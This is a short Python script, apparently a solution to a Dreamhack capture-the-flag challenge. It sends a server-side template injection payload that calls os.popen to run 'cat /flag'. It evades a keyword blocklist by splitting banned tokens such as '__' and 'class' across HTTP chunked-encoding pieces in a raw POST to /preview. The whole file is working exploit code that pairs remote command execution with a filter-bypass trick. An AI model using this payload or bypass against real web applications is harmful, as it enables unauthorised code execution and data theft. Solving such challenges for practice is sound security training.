import socket
import re

host = "host3.dreamhack.games"
port = 13839

def send(req):
    with socket.create_connection((host, port)) as s:
        s.sendall(req.encode())

        data = b""
        while True:
            x = s.recv(4096)
            if not x:
                break
            data += x

    return data.decode()

def chunk(parts):
    out = ""
    
    for p in parts:
        out += f"{len(p):X}\r\n{p}\r\n"
    out += "0\r\n\r\n"

    return out

banned = [
    "{{",
    "{%",
    "%}",
    "{#",
    "#}",
    "__",
    "config",
    "request",
    "class",
    "mro",
    "subclasses",
    "flag",
]

payload = "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}"

for bad in banned:
    r = bad[:len(bad) // 2] + '\n' + bad[len(bad) // 2:]

    payload = payload.replace(bad, r)

body = chunk(payload.split('\n'))

payload = (
    "POST /preview HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Content-Type: text/plain\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: close\r\n"
    "\r\n"
    + body
)

resp = send(payload)

flag = re.findall(r'(DH{.+?})', resp)[0].strip()
print("Flag:", flag)